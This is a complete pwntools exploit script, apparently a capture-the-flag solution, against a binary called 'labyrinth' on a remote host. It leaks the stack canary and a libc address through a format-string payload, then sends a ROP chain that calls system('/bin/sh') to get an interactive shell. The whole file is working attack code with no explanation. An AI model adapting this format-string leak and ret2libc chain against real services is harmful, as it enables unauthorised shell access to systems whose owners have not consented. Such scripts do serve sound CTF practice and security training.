#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './labyrinth'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '10.1.2.228', 1338

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x4012ac
# break *0x40135e

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    rop = ROP(elf)
    ret = rop.find_gadget(['ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    # 6 payload offset

    io.sendlineafter(b'>', b'inscribe')
    io.sendlineafter(b'>>', b'%23$p|%8$s|'.ljust(0x10, b'\x00') + p64(elf.got['printf']))

    io.recvuntil(b'bertuliskan: ')
    canary = int(io.recvuntil(b'|', drop=True), 16)
    libc.address = u64(io.recvuntil(b'|', drop=True).ljust(8, b'\x00')) - 0x61c90
    binsh = libc.address + 0x1b45bd
    system = libc.address + 0x52290

    io.sendlineafter(b'>', b'open')
    payload = flat({
        72: [
            canary,
            0x0,
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })
    io.sendline(payload)

    log.info("canary: %#x", canary)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
